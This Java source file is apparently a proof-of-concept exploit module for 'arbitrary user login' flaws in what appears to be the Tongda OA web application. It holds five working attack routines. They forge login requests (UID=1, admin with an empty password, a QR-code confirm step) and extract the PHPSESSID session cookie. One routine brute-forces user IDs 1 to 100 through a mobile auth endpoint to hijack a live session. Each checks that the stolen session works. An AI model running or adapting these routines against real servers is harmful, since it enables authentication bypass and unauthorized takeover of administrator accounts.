package com.xinyu.poc;

import com.xinyu.tools.Other;
import com.xinyu.tools.Request;
import com.xinyu.tools.Response;

import java.util.regex.Pattern;

/**
 * 任意用户登录漏洞(已完成)
 */
public class ArbitraryUserLogin {

    public static String getSession(String url, String poc) {
        if (poc.equals("poc1")) {
            return poc1(url);
        } else if (poc.equals("poc2")) {
            return poc2(url);
        } else if (poc.equals("poc3")) {
            return poc3(url);
        } else if (poc.equals("poc4")) {
            return poc4(url);
        } else {
            System.out.println("未知的POC编号");
            return null;
        }
    }

    private static String poc1(String url) {
        String cookie = null;
        String codeuid = null;

        //第一步:获取codeuid
        Response response = Request.get(url + "/ispirit/login_code.php");
        if (response != null) {
            codeuid = Other.dataCleaning(response.getText(), Pattern.compile("codeuid\":\"\\{(.*?)\\}"));
        }
        System.out.println("codeuid: " + codeuid);

        //第二步:获取cookie
        Response response2 = Request.post(url + "/logincheck_code.php", String.format("UID=1&CODEUID=_PC{%s}", codeuid));
        if (response2 != null) {
            cookie = Other.dataCleaning(response2.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
        }
        System.out.println("cookie: " + cookie);

        //第三步:检测cookie是否可用
        Response response3 = Request.get(url + "/general/", cookie);
        boolean flag = response3.getText().contains("club.tongda2000.com");
        if (!flag) {
            cookie = null;
        }
        System.out.println("cookie检测结果: " + flag);

        return cookie;
    }

    private static String poc2(String url) {
        String cookie = null;
        String codeuid = null;

        //第一步:获取codeuid
        Response response = Request.get(url + "/ispirit/login_code.php");
        if (response != null) {
            codeuid = Other.dataCleaning(response.getText(), Pattern.compile("codeuid\":\"\\{(.*?)\\}"));
        }
        System.out.println("codeuid: " + codeuid);


        Request.post(url + "/general/login_code_scan.php", String.format("uid=1&source=pc&type=confirm&codeuid={%s}", codeuid));
        Response response2 = Request.get(url + "/ispirit/login_code_check.php?codeuid={" + codeuid + "}");
        if (response2 != null) {
            cookie = Other.dataCleaning(response2.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
        }
        System.out.println("cookie: " + cookie);


        //第三步:检测cookie是否可用
        Response response3 = Request.get(url + "/general/", cookie);
        boolean flag = response3.getText().contains("club.tongda2000.com");
        System.out.println("cookie检测结果: " + flag);
        if (!flag) {
            cookie = null;
        }
        return cookie;
    }

    private static String poc3(String url) {
        String cookie = null;

        //第一步:获取cookie
        Response response2 = Request.post(url + "/logincheck_code.php", "UNAME=admin&PASSWORD=&encode_type=1&UID=1");
        if (response2 != null) {
            cookie = Other.dataCleaning(response2.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
        }
        System.out.println("cookie: " + cookie);

        //第二步:检测cookie是否可用
        Response response3 = Request.get(url + "/general/", cookie);
        boolean flag = response3.getText().contains("club.tongda2000.com");
        System.out.println("cookie检测结果: " + flag);
        if (!flag) {
            cookie = null;
        }
        return cookie;
    }

    private static String poc4(String url) {
        String cookie = null;
        String code_uid = null;

        //第一步:获取codeuid
        Response response = Request.get(url + "/general/login_code.php");
        if (response != null) {
            code_uid = Other.dataCleaning(response.getText(), Pattern.compile("code_uid\":\"\\{(.*?)\\}"));
        }
        System.out.println("code_uid: " + code_uid);

        //第二步:获取cookie
        Response response2 = Request.post(url + "/logincheck_code.php", String.format("UID=1&CODEUID={%s}", code_uid));
        if (response2 != null) {
            cookie = Other.dataCleaning(response2.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
        }
        System.out.println("cookie: " + cookie);

        //第三步:检测cookie是否可用
        Response response3 = Request.get(url + "/general/", cookie);
        boolean flag = response3.getText().contains("club.tongda2000.com");
        System.out.println("cookie检测结果: " + flag);
        if (!flag) {
            cookie = null;
        }
        return cookie;
    }


    public static String poc5(String url) {
        String cookie = null;
        String params = "/mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0";
        for (int i = 1; i <= 100; i++) {
            String payload = String.format(params, i);
//            System.out.println(payload);
            Response response = Request.get(url + payload);
            boolean flag = !(response.getText().contains("RELOGIN"));
            if (flag) {
                cookie = Other.dataCleaning(response.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
                System.out.println("漏洞存在, uid=" + i);
                break;
            }
        }
        System.out.println(cookie);
        return cookie;

    }
}
